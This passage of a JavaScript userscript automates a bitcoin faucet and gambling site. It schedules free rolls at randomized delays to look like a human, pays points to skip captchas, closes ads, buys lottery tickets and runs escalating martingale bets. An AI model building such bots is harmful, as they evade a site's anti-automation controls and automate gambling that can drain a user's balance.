            else if (r <= 71)   rand=random(3000,1200000); // xx% cases medium
            else                rand=random(500,60000); // xx% cases fast roll
            rolling_mode="Day";
        }

        if (Boolean(SLOW_MODE)) {
            if (r <= 5)        rand=random(3000,100000);
            else if (r <= 20)   rand=random(300000,1500000);
            else if (r <= 40)   rand=random(60000,2000000);
            else                rand=random(120000,3000000);
            rolling_mode="Slow";
        }

        if (Boolean(isBonusActive) && Boolean(PROMO_MODE) ) { //If promo is active, roll faster
            if (r <= 5)        rand=random(9000,3600000);
            else if (r <= 20)   rand=random(6000,1500000);
            else if (r <= 40)   rand=random(3000,1000000);
            else                rand=random(500,240000);
            rolling_mode="Promo";
        }

        if (tot_btc_winning_rolling == 0) {
            rand=random(1000,2000);
            if (LOGGING > 2) console.log('>>>>> First Execution, fast ROLL');
        }
        $("#script_output_title_msg_mode").text(rolling_mode);
        //rand = rand(1000,2000);


        // Real ROLL Function
        rollAndRetrieve(rand);


    } else if ($('#play_without_captchas_button').is(':visible')  && Boolean(PLAY_WITHOUT_CAPTCHA)){
        //Try to play without captcha, if enough RP
        if (LOGGING > 2) console.log ("[Roll] Captcha Roll");
        captchaRoll();
    } else if (rollTryCount >= 10) {
        // refresh page after 10 minutes trying
        location.reload();
    } else if (t[0] <= 0) {
        // Not in the home page window, try again in a bit
        $('#script_output_title_msg_roll').html('<span class="bold">Waiting 1m</span>');
        if (LOGGING > 2) console.log("[Roll] Retry in 1m");
        setTimeout(function(){ 
            Roll();   
        }, 60000 );
    } else {
        $('#script_output_title_msg_roll').html('<span class="bold">Waiting Next Roll</span>');
        //$("#script_output_title_msg_mode").text("Wait");
        if (LOGGING > 2) console.log("[Roll] No roll");
    }
}

function captchaRoll() {
	if (LOGGING > 4) console.log("%c[Roll] [Debug] Function captchaRoll begin", 'color:grey');
    $('#play_without_captchas_button').click();
    setTimeout(function(){
        var cost_rp = $('.play_without_captcha_description span').text();
        if (LOGGING > 2) console.log ("%c[Roll] Try to play without captcha for "+cost_rp+" RP points. You have "+points+" RP.", 'color:purple;');
        if (points >= cost_rp ) {
            // ROLL anyway paying
            if (LOGGING > 2) console.log ("[Roll] Roll with Captcha");
            $('#script_output_title_msg_roll').html('<span class="bold true">Captcha OK</span>');

            r=random(1,100);
            if (r <= 10)        rand=random(9000,7200000); // xx%, long wait, more than hour
            else if (r <= 30)   rand=random(6000,1800000); // long but not longest
            else if (r <= 71)   rand=random(3000,1200000); // xx% cases medium
            else                rand=random(500,60000); // xx% cases fast roll
            rolling_mode="Captcha";
            $("#script_output_title_msg_mode").text(rolling_mode);

            if (tot_btc_winning_rolling == 0) {
                rand=random(1000,2000);
                if (LOGGING > 2) console.log('>>>>> First Execution, fast ROLL');
            }
            rand = random(500,60000);
            rollAndRetrieve(rand);
            tot_rp_spent_captcha = Math.floor (parseInt(tot_rp_spent_captcha)+parseInt(cost_rp));
            setCookie("tot_rp_spent_captcha", tot_rp_spent_captcha, 7);
        } else {
            if (LOGGING > 2) console.log ("%c[Roll] Not enough RP. No Roll", 'color: red');
            $('#script_output_title_msg_roll').html('<span class="bold false">Miss RP</span>'); // Status on page               
        }
    }, random(1000,3000));
}

function rollAndRetrieve (rand) {
	if (LOGGING > 4) console.log("%c[Roll] [Debug] Function rollAndRetrieve begin", 'color:grey');
    var h = d.getHours();
    // Show hour when will roll in status panel
    var d1 = new Date();
    d1.setSeconds(d.getSeconds() + rand/1000);
    var [{ value: year },,{ value: month },,{ value: day },,{ value: hour },,{ value: minute }] = dateTimeFormat .formatToParts(d1);
	$('#script_output_title_msg_roll').html('<span class="bold">Roll at <span class="false">'+hour+':'+minute+'</span></span>');
    if (LOGGING > 2) console.log('%c+++Will roll in '+rand/1000/60+' minutes','color:green');

    setTimeout(function(){
        //Duplicate the visibility chek to avoid error when humans roll and don't refresh.
        if ( $('#free_play_form_button').is(':visible') ){
            $('body').focus();

            //Update Status on page
            $('#script_output_title_msg_roll').html('<span class="true">++ Rolling NOW!</span>'); // Status on page
            if (LOGGING > 2) console.log('%c+++ROLL!','color:purple; font-weight: bold');
            setTimeout(function(){
                // var event= $.Event('click');
                // event.ClientX = random(20,100).toFixed(0);
                // event.ClientY = random(5,42).toFixed(0);
                // if (LOGGING > 4) console.log('[Debug][freeRoll] Clicking at position: '+event.ClientX+':'+event.ClientY);
                $('#free_play_form_button').click();
            }, 500);
            setTimeout(function(){
                var win_btc = $('#winnings').text();
                var win_lottery = $('#fp_lottery_tickets_won').text();
                var win_rp = $('#fp_reward_points_won').text();
                executions++;

                // close tedious popup now
                closePopupInterval($('.close-reveal-modal'));

                //Update Status on page
                $('#script_output_title_msg_roll').html('<span class="true">++ Rolled</span>'); // Status on page
                $('#script_output_title_executions_num').text(executions);
                setCookie('executions', executions, 7);
                if (LOGGING > 2) console.log('%c[Roll] Execution number: '+executions,'font-weight:bold; color:green');
                if (LOGGING > 2) console.log('%c[Roll] Got '+win_btc+' btc, '+win_lottery+' tickets and '+win_rp+' RP!','font-weight:bold; color:green');
                if (win_btc > 0) {
                    tot_btc_winning_rolling = parseFloat(parseFloat(tot_btc_winning_rolling) + parseFloat(win_btc)).toFixed(8);
                    setCookie('tot_btc_winning_rolling', tot_btc_winning_rolling, 7);
                    if (LOGGING > 2) console.log('%c[Roll] BTC Won totally with script %c'+tot_btc_winning_rolling,'color: gray', 'font-weight:bold');
                } else {
                    if (LOGGING > 1) console.log('%c[Roll] Some error retrieving Roll Winnings. Winning btc was: '+win_btc, 'color: red');
                }
                if (win_lottery > 0) {
                    tot_lottery_winning_rolling = parseFloat(parseFloat(tot_lottery_winning_rolling) + parseFloat(win_lottery)).toFixed(0);
                    setCookie('tot_lottery_winning_rolling', tot_lottery_winning_rolling, 7);
                    if (LOGGING > 2) console.log('%c[Roll] Tickets Won with script %c'+tot_lottery_winning_rolling,'color: gray', 'font-weight:bold');
                } else {
                    if (LOGGING > 1) console.log('%c[Roll] Some error retrieving Roll Winnings. Winning lottery was: '+win_btc, 'color: red');
                }
                if (win_rp > 0) {
                    tot_rp_winning_rolling = parseFloat(parseFloat(tot_rp_winning_rolling) + parseFloat(win_rp)).toFixed(0);
                    setCookie('tot_rp_winning_rolling', tot_rp_winning_rolling, 7);
                    if (LOGGING > 2) console.log('%c[Roll] RP Won with script %c'+tot_rp_winning_rolling,'color: gray', 'font-weight:bold');
                } else {
                    if (LOGGING > 1) console.log('%c[Roll] Error retrieving Roll Winnings. Winning RP was: '+win_btc, 'color: red');
                }
            }, 6999);
        } else {
            if (LOGGING > 3) console.log('[Roll] Already Rolled maybe by some human..');
            //Update Status on page
            $('#script_output_title_msg_roll').html('<span class="false">Already Rolled</span>'); // Status on page
            setTimeout(function(){ location.reload(); }, 30000);
        }    },rand);

    //Random Action After ROLL
    var rand1=rand+random(1000,600000);
    rand=random(0,100);

    if (rand > ROLL_P) {
        if (LOGGING > 2) console.log('[Roll] [Debug] Reload page after roll in '+rand1/1000/60+' minutes!');
        setTimeout(function(){ location.reload(); }, rand1);
    } else if (rand <= ROLL_P && Boolean(MULTIPLY) && Boolean(isMultiplyPlayable)) {
        // Show hour when will multiply in status panel
        d1.setSeconds(d.getSeconds() + rand1/1000);
        [{ value: year },,{ value: month },,{ value: day },,{ value: hour },,{ value: minute }] = dateTimeFormat .formatToParts(d1);
        if (LOGGING > 0) console.log('[Roll] Will multiply in '+rand1/1000/60+' minutes!');
        $('#script_output_multiply_status').html('<span class="bold">Multiply at: <span class="false">'+hour+':'+minute+'</span></span>');
        setTimeout(function(){ multiply(true,h); }, rand1);
    } else {
        if (LOGGING > 2) console.log('[Roll] No action after roll. Rand was '+rand);
    }
}

function lottery () {
    //Plan buying lottery ticket
    if(Boolean(LOTTERY)){
    	if (LOGGING > 4) console.log("%c[Lottery] [Debug] Function lottery begin", 'color:gray');
        var r = random(1,100);
        var d = new Date();
        var h = d.getHours();
        var satbalance = parseInt($('#balance').text().split(".")[1]);
        var randl = random(1,LOTTERY_MAX_TICKETS).toFixed(0); //Tickets to buy
        if (r < LOTTERY_P && h >= 5 && satbalance > randl) {
            if (LOGGING > 2) console.log("[Lottery] Buy %c"+ randl + " lottery tickets %cin some time....", 'color:yellow', 'color:reset');
        	setTimeout(function(){
                $('#lottery_tickets_purchase_count').val(randl);
                setTimeout(function(){
					$('#purchase_lottery_tickets_button').click();
                    if (LOGGING > 2) console.log("%c[Lottery] Bought "+ randl + " lottery tickets", 'color:yellow');
					tot_lottery_tickets = Math.floor(parseInt(tot_lottery_tickets) + parseInt(randl));
					setCookie('tot_lottery_tickets',tot_lottery_tickets,7);
                }, random(2000,4000));
            }, random(40000,120000));
        }
    }
}

function missingTime () {
    var min = 0; var sec = 0; var str = "";
    str = $('title').text().split(" ")[0];
    //if (LOGGING > 4) console.log("%c[missingTime] [Debug] string: "+str, 'color: grey');
    if (str.length <= 7 && str.length >= 3) {
        min = str.split(':')[0]; if (min.length > 0) min = min.replace('m','');
        sec = str.split(':')[1]; if (sec.length > 0) sec = sec.replace('s','');
    } else if ( $('#free_play_form_button').is(':visible') ) {
        min = 0; sec = 0;
    } else { min = -1; sec = -1; }
    return [min,sec];
}

function random(min,max){
   return min + (max - min) * Math.random();
}

function closePopupInterval (target) {
	//if (LOGGING > 4) console.log("%c[Debug] Function closePopupInterval begin", 'color:grey');
    if (target.is(':visible')) {
        setTimeout(function(){
            if (LOGGING > 3) console.log("%cClose ADS", 'color: grey');
            target.click();
            ads_closed ++;
            $('#script_output_title_ads_closed_num').text(ads_closed);
        }, random (500,120000));
    } else {
        //if (LOGGING > 4) console.log("%cNot visible: "+target.attr('id')+" "+target.attr('class'), 'color: grey');
    }
}
function closeRandomPopupInterval (target, randomness) {
	//if (LOGGING > 4) console.log("%c[Debug] Function closeRandomPopupInterval begin", 'color:grey');
    var rand = random(1,100);
    if (rand < randomness && target.is(':visible')) {
        setTimeout(function(){
            if (LOGGING > 3) console.log("%cClose Random ADS", 'color: grey');
            target.click();
            ads_closed ++;
            $('#script_output_title_ads_closed_num').text(ads_closed);
        }, random (500,120000));
    } else {
        //if (LOGGING > 4) console.log("%cNot visible: "+target.attr('id')+" "+target.attr('class'), 'color: grey');
    }
}
function showStatus(){
	if (LOGGING > 4) console.log("%c[Debug] Function showStatus begin", 'color:grey');
    var t=missingTime();
    var date = new Date();

    var [{ value: month },,{ value: day },,{ value: year },,{ value: hour },,{ value: minute }] = dateTimeFormat .formatToParts(date );

    var ca='red'; var cb='red'; var cc='red'; var css='font-weight: bold; color:';
    var c1='purple'; var c2='olive';
    var c3='brown'; var c4='teal';
    if (LOGGING > 0) console.log(">>>>>>>>>>%c Status:%c ["+hour+":"+minute+"]", css_bold+'color:'+c1, css_bold);
    //Rewards and multiply infos and colors
    if (Boolean(REWARDS)) ca = 'green'; if (Boolean(MULTIPLY)) cb='green'; if (Boolean(LOTTERY)) cc='green';
    var cssa='font-weight: bold; color:'+ca;
    var cssb='font-weight: bold; color:'+cb;
    var cssc='font-weight: bold; color:'+cc;
    if (LOGGING > 0) console.log(">>>>>>>>>> Buying Rewards: "+"%c"+Boolean(REWARDS)+""+"%c; Playing Multiply: "+"%c"+Boolean(MULTIPLY)+""+"%c; Buying Lottery: "+"%c"+Boolean(LOTTERY), cssa, css_reset,cssb, css_reset, cssc);
    if (t[0] > 0 || t[1] > 0) {
        if (LOGGING > 0) console.log(">>>>>>>>>> Missing "+"%c"+t[0]+" min "+t[1]+" sec"+"%c for next roll",css_bold+"color:"+c1,css_reset);
    }

    if (LOGGING > 0) console.log(">>>>>>>>>> BTC won with script: "+"%c"+tot_btc_winning_rolling, css_bold+'color:'+c4);
    if (LOGGING > 0) console.log(">>>>>>>>>> Tickets won with script: "+"%c"+tot_lottery_winning_rolling, css_bold+'color:'+c4);
    if (LOGGING > 0) console.log(">>>>>>>>>> RP won with script: "+"%c"+tot_rp_winning_rolling, css_bold+'color:'+c4);
    if (LOGGING > 0) console.log(">>>>>>>>>> RP Spent with rewards: "+"%c"+tot_rp_spent_rewards, css_bold+'color:'+c1);
    if (LOGGING > 0) console.log(">>>>>>>>>> RP Spent with captcha: "+"%c"+tot_rp_spent_captcha, css_bold+'color:'+c1);
    if (LOGGING > 0) console.log(">>>>>>>>>> Multiply Balance: "+"%c"+tot_multiply_balance, css_bold+'color:'+c3);
    if (LOGGING > 0) console.log(">>>>>>>>>> Multiply Games played: "+"%c"+tot_multiply_games, css_bold+'color:'+c3);
    if (LOGGING > 0) console.log(">>>>>>>>>> Multiply Wagered: "+"%c"+tot_multiply_wagered, css_bold+'color:'+c3);

    // Update Status Message OnPage
    script_output_msg_1 =  "<span class='bold'>Config: </span>";
    script_output_msg_1 += "<span class='"+Boolean(REWARDS)+"'>REWARDS </span> <> ";
	script_output_msg_1 += "<span class='"+Boolean(BONUS1000)+"'>BONUS1000</span> <> ";
    script_output_msg_1 += "<span class='"+Boolean(MULTIPLY)+"'>MULTIPLY</span> <> ";
    script_output_msg_1 += "<span class='"+Boolean(LOTTERY)+"'>LOTTERY</span>";
    $('#script_output_msg_1').html(script_output_msg_1);

    script_output_msg_2 = "<span class='bold'> Script Winnings:  </span> ";
    script_output_msg_2 += "<span class='true'>"+tot_btc_winning_rolling+"</span> btc; ";
    script_output_msg_2 += "<span class='true'>"+tot_lottery_winning_rolling+"</span> tickets; ";
    script_output_msg_2 += "<span class='true'>"+tot_rp_winning_rolling+"</span> RP.";
	script_output_msg_2 += "</br>";
	script_output_msg_2 += "<span class='bold'> Script Spent: </span>";
	script_output_msg_2 += "<span class='true'>"+tot_lottery_tickets+"</span> in lottery tickets; ";
	script_output_msg_2 += "<span class='true'>"+tot_rp_spent_rewards+"</span> RP in bonus; ";
	script_output_msg_2 += "<span class='true'>"+tot_rp_spent_captcha+"</span> RP in captcha. ";
	script_output_msg_2 += "</br>";
	script_output_msg_2 += "<span class='bold'> Script Multiply Balance: </span>";
	script_output_msg_2 += "<span class='true'>"+tot_multiply_balance+"</span> btc in ";
	script_output_msg_2 += "<span class='true'>"+tot_multiply_games+"</span> games and ";
    script_output_msg_2 += "<span class='true'>"+tot_multiply_bets+"</span> bets";
    $('#script_output_msg_2').html(script_output_msg_2);

}

function getCookie(cname) {
  var name = cname + "=";
  var decodedCookie = decodeURIComponent(document.cookie);
  var ca = decodedCookie.split(';');
  for(var i = 0; i <ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}

function setCookie(cname, cvalue, exdays) {
  var d = new Date();
  d.setTime(d.getTime() + (exdays*24*60*60*1000));
  var expires = "expires="+ d.toUTCString();
  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function reset_all_stats(){
    if (LOGGING > 2) console.log("%c Resettnig all stats deleting all cookies", 'color:red');
    setCookie("jackpot_distance",0,7); setCookie("executions",0,7); setCookie('tot_btc_winning_rolling',0,7); setCookie('tot_lottery_winning_rolling',0,7);
    setCookie('tot_rp_winning_rolling',0,7); setCookie('tot_lottery_tickets',0,7); setCookie('tot_rp_spent_rewards',0,7); setCookie('tot_rp_spent_captcha',0,7);
    setCookie('tot_multiply_balance',0,7); setCookie('tot_multiply_games',0,7); setCookie('executions',0,7); setCookie("last_bonus",0,7);
    setCookie("last_multiply",0,7);
    location.reload();
}

// Multiply, called after the free roll, sometimes.
function multiply(after_roll, h) {
	if (LOGGING > 4) console.log("%c[Multiply] [Debug] Function multiply begin", 'color:grey');

	var t = missingTime();
    var max_missing_min = 0;
	var milli_between_multiplies = Math.floor(HOURS_BETWEEN_MULTIPLY*60*60*1000);
    var balance = parseFloat($('#balance').text()).toFixed(8);
    var bonus_mul = false;
    var last_multiply_diff = Math.floor(d.getTime() - last_multiply);

    if (LOGGING > 4) console.log("%c[Multiply] [Debug] lastMultiply diff: "+last_multiply_diff+" -- last_multiply: "+last_multiply+" -- now: "+d.getTime(), 'color:grey');

    if ($("#bonus_account_table").length != 0) {
        var bonus_mul_balance = $('#bonus_account_balance').text().split(" ")[0];
        var bonus_mul_wager_remaining = $('#bonus_account_wager').text().split(" ")[0];
		if (LOGGING > 2) console.log('%c[Multiply] bonus balance: '+bonus_mul_balance+', wager remaining: '+bonus_mul_wager_remaining, 'color:grey');
        bonus_mul = true;
    } else bonus_mul = false;
    
    if (!Boolean(MULTIPLY)) {
        if (LOGGING > 3) console.log('[Multiply] Not playing multiply. Disabled by config');
        $('#script_output_title_multiply_wait_hours').text('Disabled').removeClass('true').addClass('false');
        $('#multiply_game_mode').hide();
        $('#multiply_game_type').hide();        
        return false;
    } 
    if ( !Boolean(MULTIPLY_AT_NIGHT) && h>0 && h<6) {
        if (LOGGING > 3) console.log('%c[Multiply] Not playing multiply in the night','color:gray');
        $('#script_output_title_multiply_wait_hours').text('Wait Morning');
        return false;
    }
    if ( balance < MAX_BET && bonus_mul_balance < MAX_BET ) {
        if (LOGGING > 3) console.log('[Multiply] Not enough balance for MAX_BET');
        $('#script_output_title_multiply_wait_hours').text('Adjust MaxBet');  
        return false; 
    } 
    if ( last_multiply_diff < milli_between_multiplies ) {
        var min_between_mult=Math.floor((milli_between_multiplies - last_multiply_diff)/1000/60);
        var hours_between_mult=Math.floor(min_between_mult/60); 
        if (LOGGING > 3) console.log('[Multiply]  Not playing multiply. Wait HOURS_BETWEEN_MULTIPLY before play again, missing '+hours_between_mult+"h "+min_between_mult%60+"m");
        $('#script_output_title_multiply_wait_hours').text('Wait '+hours_between_mult+"h "+min_between_mult%60+"m");
        //$('#ref_multiply_missing_hours').text(Math.ceil((milli_between_multiplies - last_multiply_diff)/1000/60/60));
        $('#script_output_title_multiply_wait_hours').removeClass('true').addClass('false');
        return false;
    }
    if ( t[0] > 0 && t[0] <= max_missing_min ) {
        if (LOGGING > 3) console.log('[Multiply] Not playing multiply. Wait to play not near next roll, missing just %c'+t[0]+' min', 'color:purple');
        $('#script_output_title_multiply_wait_hours').text('Wait '+t[0]+'m');
        return false;
    }  
    if (Boolean(isMultiplyRunning)) {
        if (LOGGING > 3) console.log('[Multiply] Not playing multiply. Some other istance already playing');
        return false;
    }
    if (Boolean(after_roll)) {
        $('.double_your_btc_link').not('.hide_menu').click();

        tot_multiply_games = parseInt(tot_multiply_games)+1;
        setCookie("tot_multiply_games", tot_multiply_games, 7);
        setCookie("last_multiply", d, 7);
        $('#script_output_multiply_status').html('<span class="bold">Multiply: <span class="true">Running!</span></span>');
        if (LOGGING > 4) console.log(Boolean(after_roll)+", "+balance+", "+bonus_mul_balance+", "+MAX_BET+", "+Boolean(MULTIPLY));

        if (GAME_MODE == 1) {
            martingale_auto();
        } else if (GAME_MODE == 0) {
            if (GAME_TYPE <= 3) {
                martingale_manual();
            }  
        } 
    } else {
        isMultiplyPlayable = true;
        if (LOGGING > 3) console.log('[Multiply] Yes can play multiply '+isMultiplyPlayable);        
    }
}

function martingale_auto() {
    // Autobet at "martingale"
    var bet_count=0; var curr_multiply_balance=0;
    var bet_remaining=0; var winnings=0; var losings=0;
    setTimeout(function(){                
        $('#auto_bet_on').click();
        $('#autobet_base_bet').val(BAS_BET.toFixed(8)); 
        $('#autobet_max_bet').val(MAX_BET.toFixed(8));
        $('#autobet_roll_count').val(MAX_ROLLS_AT_MULTIPLY);
        $('#autobet_bet_hi').prop('checked', false); $('#autobet_bet_alternate').prop('checked', true);
    }, random(2200,5000));
    setTimeout(function(){                
        $('#show_double_your_btc_auto_bet_on_lose').click();
        $('#autobet_lose_increase_bet').prop('checked', true); $('#autobet_lose_return_to_base').prop('checked', false);
        $('#autobet_max_bet_stop').prop('checked', true); $('#autobet_max_bet_reset').prop('checked', false);
        $('#autobet_lose_increase_bet_percent').val(INCR);
        $('#autobet_dnr').prop('checked', true);
        $('#autobet_bet_odds').val(ODDS);             
    }, random(6000,11000));
    setTimeout(function(){                
        if (LOGGING > 4) console.log("Activating DOM Monitors");
        $('#double_your_btc_result').on('DOMSubtreeModified', function(){
            bet_remaining = $('#rolls_remaining_count').html();
            bet_count = $('#rolls_played_count').html();
            if ($("#double_your_btc_bet_lose").html().length > 0 ) {
                winnings = $("#double_your_btc_bet_win").html().split(" ")[6];
                losings = $("#double_your_btc_bet_lose").html().split(" ")[6];
                if (LOGGING > 4) console.log("winning: "+winnings+", losing: "+losings+", play remaining: "+bet_remaining+", play count: "+bet_count);
                if (losings == MAX_BET || bet_remaining == 0) {
                    //finished
                    if (LOGGING > 4) console.log("Disabling Monitors, finished multiply");                              
                    $("#double_your_btc_result").off('DOMSubtreeModified');
                    curr_multiply_balance = $('#autobet_pl').html().split(" ")[0];
                    tot_multiply_balance = parseFloat(parseFloat(tot_multiply_balance) + parseFloat(curr_multiply_balance)).toFixed(8);
                    tot_multiply_bets = parseInt(parseInt(tot_multiply_bets) + parseInt(bet_count));
                    setCookie('tot_multiply_balance', tot_multiply_balance, 7);
                    setCookie('tot_multiply_bets', tot_multiply_bets, 7);
                    if (LOGGING > 4) console.log("tot balance: "+tot_multiply_balance+", curr bal: "+curr_multiply_balance+", tot bets: "+tot_multiply_bets+", play_remaining: "+bet_remaining);
                }
            }
        });
        $('#start_autobet').click();            
    }, random(17100,30000));
    $('#script_output_title_multiply_wait_hours').text('Completed');
    setCookie("last_multiply", d, 7);
}

function martingale_manual () {
    var bet_count=0; var bet_remaining=0; 
    var past_bet; var bet_amount; var bet_odds; var bet_hilo;
    var winnings=0; var won=0; 
    var consecutive_lost=0; var consecutive_win=0;

    var fast_bet=false; var log_msg = ""; var c; 
    var curr_multiply_balance=0; var curr_multiply_wagered = 0;

    var max_consecutive_losts_session=0; var max_consecutive_wins_session=0;
    var max_consecutive_losts_inplay_session=0; var max_bet_session=0;
    var last_session_hist=[];

    // Global vars setting to avoid duplicate games and increments.
    // as error reported bug on play 
    game2_consecutive_lost_passed=false; game2_finished_loosing=false; game2_play_began=false; 
    game2_play_after_losses=0; game2_step=0; game2_play_count=0; 
    
    // Multilpy Running
    isMultiplyRunning = true;

    // Activate DOM Monitors
    if (LOGGING > 4) console.log("[Multiply] Activating DOM Monitors, beginning to play");
    $('#double_your_btc_result').on('DOMSubtreeModified', function(){
        if ( $('#double_your_btc_error').html().length > 0 ) {
            var multiply_error = $('#double_your_btc_error').html();
            console.log('%c[Multiply] Fatal Error in multiply: '+multiply_error, 'color: red');
            $('#script_output_title_multiply_wait_hours').text('Fatal Error').removeClass(true).addClass('false');
            setCookie('multiply_error', multiply_error, 31);
            return true;
        } else if ( $("#double_your_btc_bet_win").html().length > 0 ) {
            won = 1; c="green"; fast_bet = true;
            winnings = $("#double_your_btc_bet_win").html().split(" ")[6];
            if (winnings > 0) {
                tot_multiply_balance = parseFloat(parseFloat(tot_multiply_balance) + parseFloat(winnings)).toFixed(8);
                curr_multiply_balance = parseFloat(parseFloat(curr_multiply_balance) + parseFloat(winnings)).toFixed(8);
            }
            consecutive_win++;
            consecutive_lost=0;
        } else if ($("#double_your_btc_bet_lose").html().length > 0 ) {
            won = -1; c = "red";
            winnings = $("#double_your_btc_bet_lose").html().split(" ")[6];
            if (winnings > 0) {
                tot_multiply_balance = parseFloat(parseFloat(tot_multiply_balance) - parseFloat(winnings)).toFixed(8);
                curr_multiply_balance = parseFloat(parseFloat(curr_multiply_balance) - parseFloat(winnings)).toFixed(8);
            }
            consecutive_lost++;
            consecutive_win=0;
        } else won = 0;

        if (won != 0) {
            // COOKIES for STATISTICS
            setCookie("tot_multiply_balance", tot_multiply_balance, 7);
            setCookie('curr_multiply_balance',curr_multiply_balance,7);
            var rolled = $('#previous_roll').text();

            last_session_hist.push(curr_multiply_balance);
            setCookie('last_multiply_session_hist',JSON.stringify(last_session_hist),7)

            //Session Cookie
            if (consecutive_lost >= max_consecutive_losts_session) {
                max_consecutive_losts_session=consecutive_lost;
                setCookie('max_consecutive_losts_session', max_consecutive_losts_session, 7);
            }
            if (consecutive_lost >= max_consecutive_losts_inplay_session && bet_amount > MIN_BET) {
                max_consecutive_losts_inplay_session=consecutive_lost;
                setCookie('max_consecutive_losts_inplay_session',max_consecutive_losts_inplay_session,7); 
            }
            if (bet_amount >= max_bet_session) {
                max_bet_session=bet_amount;
                setCookie('max_bet_session',max_bet_session,7);
            }

            //General Cookies
            if (consecutive_lost > max_consecutive_losts_inplay && bet_amount > MIN_BET) {
                max_consecutive_losts_inplay = consecutive_lost;
                setCookie('max_consecutive_losts_inplay',max_consecutive_losts_inplay,7);
            } 
            if (consecutive_lost > max_consecutive_losts) {
                max_consecutive_losts=consecutive_lost;
                setCookie('max_consecutive_losts', consecutive_lost, 365);
            }

            // Next bet values getting
            bet_amount = get_bet_amount(past_bet, consecutive_lost, consecutive_win);
            bet_hilo=get_bet_hilo(consecutive_lost);
            bet_odds = get_bet_odds();

            if (LOGGING > 4) {
                log_msg =  "Rolled:"+rolled+",%c Won:"+parseFloat(winnings).toFixed(8)+"%c, Played#:"+bet_count;
                log_msg += "/"+MAX_ROLLS_AT_MULTIPLY+"/"+game2_play_count+", L/W: "+consecutive_lost+"/"+consecutive_win;
                log_msg += ", CurrBal:"+curr_multiply_balance+", TotBal:"+tot_multiply_balance;
                log_msg += " <Next bet: "+parseFloat(bet_amount).toFixed(8)+"("+game2_step+") on "+bet_hilo+", Fast: "+fast_bet+">";
                console.log(log_msg, css_bold+"color:"+c, css_reset);
            }

            // Play or finished logic
            if ( (bet_count < MAX_ROLLS_AT_MULTIPLY || consecutive_lost > 0) && game2_play_count < MAX_PLAY && bet_amount <= MAX_BET) {                

                curr_multiply_wagered = parseFloat(parseFloat(curr_multiply_wagered) + parseFloat(bet_amount)).toFixed(8);
                tot_multiply_wagered = parseFloat(parseFloat(tot_multiply_wagered) + parseFloat(bet_amount)).toFixed(8);
                setCookie('tot_multiply_wagered',tot_multiply_wagered, 365);
                setCookie('curr_multiply_wagered',curr_multiply_wagered, 14);

                if (past_bet != bet_amount) fast_bet=false;
                else fast_bet=true;

                bet_count++; 
                past_bet=bet_amount;

                // call the bet
                bet(bet_amount, bet_hilo, bet_odds, fast_bet);
                
            } else {
                // Finished playing multiply
                // Deactivate DOM Monitors
                $("#double_your_btc_result").off('DOMSubtreeModified');
                
                multiply_hist_arr.push(tot_multiply_balance);
                setCookie('multiply_hist_arr',JSON.stringify(multiply_hist_arr),14);
                console.log("%cMultiply hist array: "+multiply_hist_arr, 'color:grey');
                if (LOGGING > 2) {
                    if (bet_amount > MAX_BET) {
                        console.log("%c Max Bet limit passed. Max Bet: "+MAX_BET+", Next Bet: "+bet_amount, 'color: red');
                    } else if (bet_count >= MAX_ROLLS_AT_MULTIPLY ) {
                        console.log("%c Max Rolls limit passed. Max Rolls: "+MAX_ROLLS_AT_MULTIPLY+", Tot Rolls: "+bet_count+" with "+consecutive_lost+" cons losts", 'color: red');
                    } else if (game2_play_count >= MAX_PLAY) {
                        console.log("%c Max Plays limit passed. Max Plays: "+MAX_PLAY+", Tot Plays: "+game2_play_count, 'color: red');
                    }
                }
                if (LOGGING > 4) console.log("%c Disabling Monitors, finished multiply", css_bold+'color:green');                                               
                if (LOGGING > 4) console.log("%c Tot Balance: "+tot_multiply_balance+", Tot games: "+tot_multiply_games+", Tot bets: "+tot_multiply_bets, css_bold+'color: green');
                if (LOGGING > 4) console.log("%c Session Balance: "+curr_multiply_balance+", Session tot bets: "+bet_count, css_bold+'color:green');
                $('#script_output_multiply_status').html('<span class="bold">Multiply: <span class="true">Done!</span></span>');
                setTimeout(function(){ 
                    isMultiplyRunning = false;
                    $('.free_play_link').not('.hide_menu').click(); 
                }, random(3000,30000));
            }
        } else {
            return true;
        }
    });
    // Execute first bet, that cause all the others
    setTimeout(function(){
        bet_hilo = get_bet_hilo(0);
        bet_amount = get_bet_amount(MIN_BET,0,0);
        bet_odds = get_bet_odds();
        bet_count++; past_bet=bet_amount;     
        bet(bet_amount, bet_hilo, bet_odds, false);
    }, random (3500,6500) );
}

function get_bet_amount(past_bet, consecutive_lost, consecutive_win){
    if (GAME_TYPE == 0) {
        if (consecutive_lost == 0) {
            tot_multiply_play++;
            setCookie('tot_multiply_play', tot_multiply_play, 7);
            return BAS_BET;
        }
        else return past_bet*2;
    } else if (GAME_TYPE == 1 || WAIT_PLAY_AFTER_LOSSES == 0){
        if (consecutive_lost < MIN_LOSSES_BEFORE_PLAY) {
            return MIN_BET;
        } else if (consecutive_lost == MIN_LOSSES_BEFORE_PLAY){
            tot_multiply_play++;
            setCookie('tot_multiply_play', tot_multiply_play, 7);
            return BAS_BET;
        } else {
            return past_bet+(past_bet*INCR/100);
        }
    } else if (GAME_TYPE == 2 || GAME_TYPE == 3) {
        if (!Boolean(game2_consecutive_lost_passed)) {
            if (consecutive_lost < MIN_LOSSES_BEFORE_PLAY) {
                game2_step=1;
                return MIN_BET;
            } else if (consecutive_lost == MIN_LOSSES_BEFORE_PLAY){
                // passed tot lost, next step -> else
                game2_step=2;
                game2_consecutive_lost_passed = true;
                return MIN_BET;
            } 
        } else {
            if (!Boolean(game2_finished_loosing)) {
                if (consecutive_win == 0 ) {
                    game2_step=3;
                    return MIN_BET;
                } else {
                    //finished loosing, first win, next step -> else
                    game2_step=4;
                    game2_finished_loosing=true;
                    game2_play_after_losses++;
                    return get_bet_amount(MIN_BET,consecutive_lost,consecutive_win);
                }  
            } else {
                if (!Boolean(game2_play_began)){
                    if (game2_play_after_losses < WAIT_PLAY_AFTER_LOSSES) {
                        game2_step=5;
                        game2_play_after_losses++;
                        return MIN_BET;
                    } else if (game2_play_after_losses >= WAIT_PLAY_AFTER_LOSSES){
                        // Begin to play, next step -> else
                        game2_step=6;
                        game2_play_began=true;
                        tot_multiply_play++;
                        setCookie('tot_multiply_play', tot_multiply_play, 7);
                        return BAS_BET;
                    } 
                } else {
